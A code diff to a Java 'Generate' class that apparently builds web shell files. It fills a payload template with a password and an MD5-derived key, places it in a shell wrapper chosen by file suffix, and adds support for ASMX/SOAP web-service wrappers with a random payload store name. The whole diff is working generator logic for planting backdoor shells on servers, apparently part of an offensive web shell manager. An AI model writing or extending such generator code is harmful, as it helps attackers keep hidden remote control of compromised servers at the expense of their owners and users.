@@ -22,16 +22,30 @@ class Generate {
             InputStream inputStream = Generate.class.getResourceAsStream("template/" + templateName);
             String code = new String(functions.readInputStream(inputStream));
             inputStream.close();
-            String code2 = code.replace("{pass}", pass).replace("{secretKey}", functions.md5(secretKey).substring(0, 16));
+            // same as original: only pass/secretKey inside the payload stub
+            String key16 = functions.md5(secretKey).substring(0, 16);
+            String code2 = code.replace("{pass}", pass).replace("{secretKey}", key16);
             InputStream inputStream2 = Generate.class.getResourceAsStream("template/shell." + suffix);
             String template = new String(functions.readInputStream(inputStream2));
             inputStream2.close();
-            data = template.replace("{code}", code2).getBytes();
-            data= StartProcessor.process(data,suffix);
+            String assembled = template.replace("{code}", code2);
+            // asmx/soap wrappers still have {pass} on the WebMethod name after {code} insert
+            if (isWebServiceSuffix(suffix)) {
+                String storeName = functions.getRandomString(8);
+                assembled = assembled.replace("{pass}", pass)
+                        .replace("{secretKey}", key16)
+                        .replace("{payloadStoreName}", storeName);
+            }
+            data = assembled.getBytes();
+            data = StartProcessor.process(data, suffix);
         } catch (Exception var10) {
             Log.error(var10);
         }
 
         return data;
+    }
+
+    private static boolean isWebServiceSuffix(String suffix) {
+        return suffix != null && ("asmx".equalsIgnoreCase(suffix) || "soap".equalsIgnoreCase(suffix));
     }
 }
